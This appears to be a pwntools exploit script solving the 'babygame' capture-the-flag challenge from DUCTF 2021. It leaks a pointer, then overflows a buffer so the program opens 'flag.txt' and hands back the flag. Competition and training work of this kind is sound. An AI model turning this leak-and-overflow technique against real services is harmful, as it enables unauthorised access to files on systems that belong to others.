from pwn import *


io = remote('pwn-2021.duc.tf', 31907)
#io = process('./babygame')

print(io.recv())
payload = b'A'*40
io.sendline(payload)
print(io.recvuntil('> '))
print(io.recvuntil('> '))
io.sendline('2')
io.recv(32)
leak = u64(io.recv(6)+b'\0\0') + 8316
print(hex(leak))
print(io.recvuntil('> '))
io.sendline('1')
print(io.recv())
payload = b'flag.txt'+b'\0'*24+p64(leak)
io.sendline(payload)
print(io.recvuntil('> '))
print(io.recvuntil('> '))
io.sendline('1337')
print(io.recv())
io.sendline('1413698884')
io.interactive()
